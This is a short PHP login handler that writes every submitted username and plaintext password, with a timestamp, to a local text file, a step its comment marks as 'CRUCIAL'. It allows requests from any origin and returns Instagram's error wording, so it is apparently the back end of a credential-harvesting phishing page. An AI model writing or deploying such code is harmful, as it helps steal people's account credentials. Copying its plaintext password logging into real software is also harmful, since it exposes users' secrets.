<?php
/**
 * login.php - Handles login POST requests
 * Logs every attempt to my_login_log.txt
 */

header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST');
header('Access-Control-Allow-Headers: Content-Type');

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['error' => 'Method not allowed']);
    exit;
}

$data     = json_decode(file_get_contents('php://input'), true);
$username = isset($data['username']) ? trim($data['username']) : '';
$password = isset($data['password']) ? $data['password'] : '';

if (empty($username) || empty($password)) {
    http_response_code(400);
    echo json_encode(['error' => 'Username and password are required.']);
    exit;
}

// ★ CRUCIAL: Log every attempt with timestamp, username, password
$timestamp = date('Y-m-d\TH:i:s');
$log_line  = "[{$timestamp}] username=\"{$username}\" password=\"{$password}\"" . PHP_EOL;
$log_file  = __DIR__ . '/my_login_log.txt';
file_put_contents($log_file, $log_line, FILE_APPEND | LOCK_EX);

// Demo user store
$user_store = [
    'demo_user' => 'instagram123',
];

if (!isset($user_store[$username]) || $user_store[$username] !== $password) {
    http_response_code(401);
    echo json_encode([
        'error' => 'Sorry, your password was incorrect. Please double-check your password.'
    ]);
    exit;
}

http_response_code(200);
echo json_encode(['message' => "Welcome back, {$username}! You are now logged in."]);
